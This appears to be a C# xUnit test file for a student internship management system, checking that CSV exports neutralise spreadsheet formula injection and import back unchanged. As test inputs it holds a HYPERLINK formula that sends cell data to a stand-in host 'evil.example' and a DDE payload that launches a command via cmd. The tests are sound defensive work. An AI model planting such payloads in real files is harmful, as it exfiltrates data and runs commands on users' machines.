using InternshipManagement.BLL.Common;
using InternshipManagement.BLL.Services.Admin;
using InternshipManagement.DAL;
using InternshipManagement.DAL.Entities;
using Microsoft.EntityFrameworkCore;
using Xunit;

namespace InternshipManagement.UnitTests;

// Dữ liệu người dùng nhập (tên công ty tự tìm do SV khai, tên SV...) không được chạy như công thức khi Khoa mở tệp CSV bằng Excel.
public class CsvExportSafetyTests
{
    private const string Formula = "=HYPERLINK(\"http://evil.example/?d=\"&A1,\"Xem\")";

    [Theory]
    [InlineData(Formula)]
    [InlineData("+cmd|' /C calc'!A0")]
    [InlineData("@SUM(A1)")]
    [InlineData("-2+3")]
    public void FormulaLikeTextIsNeutralised(string value)
    {
        var cell = TabularExport.CsvCell(value);

        Assert.StartsWith("\"'", cell);
        Assert.Equal(value, TabularExport.FromCsvCell(cell[1..^1].Replace("\"\"", "\"")));
    }

    [Theory]
    [InlineData("Công ty FPT, chi nhánh 1")]
    [InlineData("'Tên có dấu nháy")]
    public void OrdinaryTextIsOnlyQuoted(string value)
    {
        Assert.Equal("\"" + value.Replace("\"", "\"\"") + "\"", TabularExport.CsvCell(value));
        Assert.Equal(value, TabularExport.FromCsvCell(value));
    }

    private static AppDbContext Db() => new(new DbContextOptionsBuilder<AppDbContext>().UseInMemoryDatabase(Guid.NewGuid().ToString()).Options);

    [Fact]
    public async Task CatalogExportIsSafeAndImportsBackUnchanged()
    {
        await using var source = Db();
        source.CongTys.Add(new CongTy { MaCongTy = "CT1", TenCongTy = Formula, TrangThai = "DaDuyet", SoLuongNhan = 2 });
        await source.SaveChangesAsync();

        var csv = await new CatalogImportService(source, null!, null!).ExportAsync("cong-ty");

        Assert.Contains("\"'=HYPERLINK(", csv);
        await using var target = Db();
        await new CatalogImportService(target, null!, null!).ImportAsync("cong-ty", csv);
        Assert.Equal(Formula, (await target.CongTys.SingleAsync()).TenCongTy);
    }
}
